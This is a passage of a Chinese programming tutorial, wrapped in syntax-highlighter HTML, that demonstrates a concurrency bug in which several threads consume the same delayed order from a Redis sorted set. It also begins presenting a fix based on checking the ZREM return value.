style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358d2981261715-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358d2981261715-28\">28</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rjzheng</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">delay4</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">concurrent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">CountDownLatch</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-5\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ThreadTest</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">threadNum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CountDownLatch </span><span class=\"crayon-v\">cdl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CountDownLatch</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">threadNum</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">DelayMessage</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">implements</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Runnable</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-11\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">cdl</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">await</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">InterruptedException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-13\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// TODO Auto-generated catch block</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-14\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">printStackTrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">AppTest </span><span class=\"crayon-v\">appTest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AppTest</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">appTest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">consumerDelayMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">AppTest </span><span class=\"crayon-v\">appTest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AppTest</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">appTest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">productionDelayMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">threadNum</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Thread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">DelayMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">start</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-25\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">cdl</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">countDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358d2981261715-27\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358d2981261715-28\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0043 seconds] -->\r\n<p>输出如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358db025994664\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n1525087157727ms:redis生成了一个订单任务：订单ID为OID00000010\r\n1525087157734ms:redis生成了一个订单任务：订单ID为OID00000011\r\n1525087157738ms:redis生成了一个订单任务：订单ID为OID00000012\r\n1525087157747ms:redis生成了一个订单任务：订单ID为OID00000013\r\n1525087157753ms:redis生成了一个订单任务：订单ID为OID00000014\r\n1525087160009ms:redis消费了一个任务：消费的订单OrderId为OID00000010\r\n1525087160011ms:redis消费了一个任务：消费的订单OrderId为OID00000010\r\n1525087160012ms:redis消费了一个任务：消费的订单OrderId为OID00000010\r\n1525087160022ms:redis消费了一个任务：消费的订单OrderId为OID00000011\r\n1525087160023ms:redis消费了一个任务：消费的订单OrderId为OID00000011\r\n1525087160029ms:redis消费了一个任务：消费的订单OrderId为OID00000011\r\n1525087160038ms:redis消费了一个任务：消费的订单OrderId为OID00000012\r\n1525087160045ms:redis消费了一个任务：消费的订单OrderId为OID00000012\r\n1525087160048ms:redis消费了一个任务：消费的订单OrderId为OID00000012\r\n1525087160053ms:redis消费了一个任务：消费的订单OrderId为OID00000013\r\n1525087160064ms:redis消费了一个任务：消费的订单OrderId为OID00000013\r\n1525087160065ms:redis消费了一个任务：消费的订单OrderId为OID00000014\r\n1525087160069ms:redis消费了一个任务：消费的订单OrderId为OID00000014\r\n当前没有等待的任务\r\n当前没有等待的任务\r\n当前没有等待的任务\r\n当前没有等待的任务</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358db025994664-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358db025994664-22\">22</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-1\"><span class=\"crayon-cn\">1525087157727ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000010</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-2\"><span class=\"crayon-cn\">1525087157734ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000011</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-3\"><span class=\"crayon-cn\">1525087157738ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000012</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-4\"><span class=\"crayon-cn\">1525087157747ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000013</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-5\"><span class=\"crayon-cn\">1525087157753ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>生成了一个订单任务：订单<span class=\"crayon-i\">ID</span>为<span class=\"crayon-i\">OID00000014</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-6\"><span class=\"crayon-cn\">1525087160009ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000010</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-7\"><span class=\"crayon-cn\">1525087160011ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000010</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-8\"><span class=\"crayon-cn\">1525087160012ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000010</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-9\"><span class=\"crayon-cn\">1525087160022ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000011</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-10\"><span class=\"crayon-cn\">1525087160023ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000011</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-11\"><span class=\"crayon-cn\">1525087160029ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000011</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-12\"><span class=\"crayon-cn\">1525087160038ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000012</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-13\"><span class=\"crayon-cn\">1525087160045ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000012</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-14\"><span class=\"crayon-cn\">1525087160048ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000012</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-15\"><span class=\"crayon-cn\">1525087160053ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000013</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-16\"><span class=\"crayon-cn\">1525087160064ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000013</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-17\"><span class=\"crayon-cn\">1525087160065ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000014</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-18\"><span class=\"crayon-cn\">1525087160069ms</span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">redis</span>消费了一个任务：消费的订单<span class=\"crayon-i\">OrderId</span>为<span class=\"crayon-i\">OID00000014</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-19\">当前没有等待的任务</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-20\">当前没有等待的任务</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358db025994664-21\">当前没有等待的任务</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358db025994664-22\">当前没有等待的任务</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0046 seconds] -->\r\n<p>显然，出现了多个线程消费同一个资源的情况。</p>\n<h4 id=\"解决方案\">解决方案</h4>\n<p>(1)用分布式锁，但是用分布式锁，性能下降了，该方案不细说。<br>\n(2)对ZREM的返回值进行判断，只有大于0的时候，才消费数据，于是将consumerDelayMessage()方法里的</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358e0553458802\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif(nowSecond &gt;= score){\r\n    String orderId = ((Tuple)items.toArray()[0]).getElement();\r\n    jedis.zrem(\"OrderId\", orderId);\r\n    System.out.println(System.currentTimeMillis()+\"ms:redis消费了一个任务：消费的订单OrderId为\"+orderId);\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358e0553458802-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358e0553458802-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358e0553458802-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358e0553458802-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358e0553458802-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358e0553458802-1\"><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nowSecond</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358e0553458802-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Tuple</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">items</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getElement</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358e0553458802-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">zrem</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"OrderId\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358e0553458802-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">System</span><span 